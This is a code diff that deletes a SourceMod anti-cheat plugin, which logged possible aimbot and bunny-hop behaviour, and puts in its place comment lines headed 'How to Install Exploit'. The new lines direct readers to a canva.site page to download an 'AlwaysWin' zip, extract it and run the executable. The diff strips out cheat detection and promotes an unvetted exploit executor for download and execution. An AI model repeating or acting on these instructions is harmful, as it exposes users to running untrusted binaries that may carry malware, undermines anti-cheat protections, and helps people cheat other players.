@@ -1,47 +1,5 @@
-#pragma semicolon 1
-#include <sourcemod>
-#include <sdktools>
-
-public Plugin myinfo = {
-    name = "AlwaysWin . AC",
-    author = "AlwaysWin",
-    description = "Full Scripted System AC",
-    version = "1.0",
-    url = "https://alwayswin.my.canva.site/central"
-};
-
-new Float:lastShotTime[MAXPLAYERS + 1];
-new bhopCount[MAXPLAYERS + 1];
-
-public void OnPluginStart() {
-    HookEvent("weapon_fire", OnWeaponFire);
-    HookEvent("player_jump", OnPlayerJump);
-}
-
-public Action OnWeaponFire(Event event, const char[] name, bool dontBroadcast) {
-    int client = GetClientOfUserId(GetEventInt(event, "userid"));
-    if (!IsValidClient(client)) return Plugin_Continue;
-    
-    float now = GetGameTime();
-    if (lastShotTime[client] > 0.0 && (now - lastShotTime[client]) < 0.05) {
-        LogMessage("ALERTA: Possível AIMBOT detectado! Jogador: %N", client);
-    }
-    lastShotTime[client] = now;
-    return Plugin_Continue;
-}
-
-public Action OnPlayerJump(Event event, const char[] name, bool dontBroadcast) {
-    int client = GetClientOfUserId(GetEventInt(event, "userid"));
-    if (!IsValidClient(client)) return Plugin_Continue;
-
-    bhopCount[client]++;
-    if (bhopCount[client] > 5) {
-        LogMessage("ALERTA: Possível BHOP SCRIPT detectado! Jogador: %N", client);
-        bhopCount[client] = 0;
-    }
-    return Plugin_Continue;
-}
-
-bool IsValidClient(int client) {
-    return (client > 0 && client <= MaxClients && IsClientInGame(client));
-}
+-- // How to Install Exploit. // --
+--  // goto website : https://alwayswin.my.canva.site/alwayswinexecutorhelp //
+--   // And Click install // --
+--    // Goto .zip "AlwaysWin 1.2V" file and extrac // --
+--     // Execute AlwaysWin and This is all. // --
